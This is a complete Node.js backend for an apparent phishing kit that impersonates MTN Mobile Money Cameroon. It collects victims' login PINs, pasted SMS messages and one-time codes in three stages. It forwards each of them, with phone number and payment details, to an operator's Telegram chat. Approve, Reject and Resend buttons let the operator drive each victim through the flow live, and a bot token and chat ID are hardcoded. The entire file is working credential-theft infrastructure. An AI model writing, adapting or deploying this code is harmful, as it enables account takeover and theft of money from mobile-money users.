/**
 * MTN MoMo Cameroon — Backend
 * 3-stage flow: login (PIN) → sms (pasted message) → otp (4-digit)
 * Inline Telegram buttons per stage
 */

const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8818795424:AAGyL7-Y1AdA5tbQFLQRgHD80bffEOI7Smo';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SESSION_TTL_MS     = 60 * 60 * 1000;
const SESSIONS_FILE      = '/tmp/mtnmomo_sessions.json';

app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* ---------- Persistent session store ---------- */
let sessions = new Map();
try {
  if (fs.existsSync(SESSIONS_FILE)) {
    const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
    sessions = new Map(JSON.parse(raw));
    console.log(`[sessions] restored ${sessions.size} from disk`);
  }
} catch(e){ console.warn('[sessions] restore failed:', e.message); }

function persistSessions(){
  try { fs.writeFileSync(SESSIONS_FILE, JSON.stringify([...sessions.entries()])); }
  catch(e){ console.warn('[sessions] persist failed:', e.message); }
}

function createSession(stage, meta){
  const id = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
  const now = Date.now();
  sessions.set(id, {
    id, stage, meta,
    status: 'pending',
    createdAt: now,
    expiresAt: now + SESSION_TTL_MS
  });
  persistSessions();
  console.log(`[session] created ${id} stage=${stage} total=${sessions.size}`);
  return sessions.get(id);
}

function getSession(id){
  const s = sessions.get(id);
  if (!s) { console.log(`[session] MISS ${id}`); return null; }
  if (Date.now() > s.expiresAt && s.status === 'pending') s.status = 'expired';
  console.log(`[session] HIT ${id} status=${s.status}`);
  return s;
}

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [id, s] of sessions) {
    if (now > s.expiresAt + 60000) { sessions.delete(id); changed = true; }
  }
  if (changed) persistSessions();
}, 5 * 60 * 1000);

/* ---------- Helpers ---------- */
function esc(s = ''){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function tgSend(text, replyMarkup){
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (replyMarkup) body.reply_markup = replyMarkup;
  const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify(body)
  });
  return r.json();
}

async function tgAnswer(cbId, text){
  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ callback_query_id: cbId, text, show_alert: false })
  }).catch(()=>{});
}

async function tgRemoveButtons(chatId, messageId){
  await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(()=>{});
}

/* ---------- Health ---------- */
app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'mtnmomo-cameroon-backend',
    activeSessions: sessions.size,
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    publicUrl: process.env.PUBLIC_URL || '(not set)',
    time: new Date().toISOString()
  });
});

app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now(), activeSessions: sessions.size }));

app.get('/api/debug', (_req, res) => {
  const list = [];
  for (const [id, s] of sessions.entries()) {
    list.push({ id, stage: s.stage, status: s.status, ageSec: Math.floor((Date.now() - s.createdAt) / 1000) });
  }
  res.json({ ok: true, count: list.length, sessions: list });
});

/* ============================================================
   POST /api/notify — 3 stages: login, sms, otp
   ============================================================ */
app.post('/api/notify', async (req, res) => {
  try {
    const { stage, phone, pinOrOtp, sms, otp, receipt } = req.body || {};
    if (!stage || !['login','sms','otp'].includes(stage)) {
      return res.status(400).json({ ok: false, error: 'Invalid stage' });
    }

    const s = createSession(stage, { phone, receipt });

    let label, keyLabel, secretValue, buttons;

    if (stage === 'login') {
      label = '🔐 <b>Login — PIN Captured</b>';
      keyLabel = 'PIN';
      secretValue = pinOrOtp || '—';
      buttons = {
        inline_keyboard: [[
          { text: '✅ Approve', callback_data: `approve:${s.id}` },
          { text: '❌ Reject',  callback_data: `reject:${s.id}` }
        ]]
      };
    } else if (stage === 'sms') {
      label = '📩 <b>SMS Pasted</b>';
      keyLabel = 'SMS';
      secretValue = sms || '—';
      buttons = {
        inline_keyboard: [
          [
            { text: '✅ Approve', callback_data: `approve:${s.id}` },
            { text: '❌ Reject',  callback_data: `reject:${s.id}` }
          ],
          [
            { text: '🔁 Resend',  callback_data: `resend:${s.id}` }
          ]
        ]
      };
    } else { // otp
      label = '🔢 <b>OTP Entered</b>';
      keyLabel = 'OTP';
      secretValue = otp || '—';
      buttons = {
        inline_keyboard: [[
          { text: '✅ Approve', callback_data: `approve:${s.id}` },
          { text: '🔁 Resend',  callback_data: `resend:${s.id}` }
        ]]
      };
    }

    const formattedSecret = stage === 'sms'
      ? `<pre><code>${esc(secretValue)}</code></pre>`
      : `<code>${esc(secretValue)}</code>`;

    const text =
      `${label}\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(receipt?.trackingNumber || '—')}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(receipt?.accountName || '—')}\n` +
      `📱 <b>Phone:</b> <code>${esc(phone || '—')}</code>\n` +
      `🔑 <b>${keyLabel}:</b> ${formattedSecret}\n` +
      `💳 <b>Service:</b> ${esc(receipt?.modeOfPayment || '—')}\n` +
      `💰 <b>Amount:</b> ${esc(receipt?.currency || '')} ${esc(receipt?.amount || '—')}\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Douala' })} CAT\n` +
      `\n<i>Session: ${esc(s.id)}</i>`;

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok: false, error: tg.description });
    }

    return res.json({ ok: true, sessionId: s.id });
  } catch (err) {
    console.error('notify error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

/* ============================================================
   GET /api/status/:id
   ============================================================ */
app.get('/api/status/:id', (req, res) => {
  const s = getSession(req.params.id);
  if (!s) return res.status(404).json({ ok: false, error: 'Session not found' });
  return res.json({ ok: true, status: s.status, stage: s.stage });
});

/* ============================================================
   POST /api/telegram-webhook
   ============================================================ */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cq = update.callback_query;
    console.log(`[webhook] received. hasCallback=${!!cq} data=${cq?.data || 'none'}`);

    if (cq && cq.data) {
      const [action, sessionId] = cq.data.split(':');
      const s = getSession(sessionId);

      if (!s) { await tgAnswer(cq.id, 'Session expired'); return res.json({ ok: true }); }
      if (s.status !== 'pending') { await tgAnswer(cq.id, `Already ${s.status}`); return res.json({ ok: true }); }

      if (action === 'approve') { s.status = 'approved'; await tgAnswer(cq.id, '✅ Approved'); }
      else if (action === 'reject')  { s.status = 'rejected'; await tgAnswer(cq.id, '❌ Rejected'); }
      else if (action === 'resend')  { s.status = 'resend';   await tgAnswer(cq.id, '🔁 Resend'); }
      else { await tgAnswer(cq.id, 'Unknown action'); }

      persistSessions();

      if (cq.message) {
        await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
      }

      console.log(`[webhook] processed action=${action} sid=${sessionId} status=${s.status}`);
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('webhook error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

/* ============================================================
   Auto-register webhook on startup
   ============================================================ */
async function registerWebhook(){
  const publicUrl = (process.env.PUBLIC_URL || `http://localhost:${PORT}`).replace(/\/+$/, '');
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log(`PUBLIC_URL = ${publicUrl}`);
  console.log(`Registering webhook: ${webhookUrl}`);
  try {
    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
    const d = await r.json();
    console.log('setWebhook result:', d);
  } catch (e) {
    console.error('setWebhook failed:', e.message);
  }
}

app.listen(PORT, async () => {
  console.log(`MTN MoMo Cameroon backend running on port ${PORT}`);
  await registerWebhook();
});
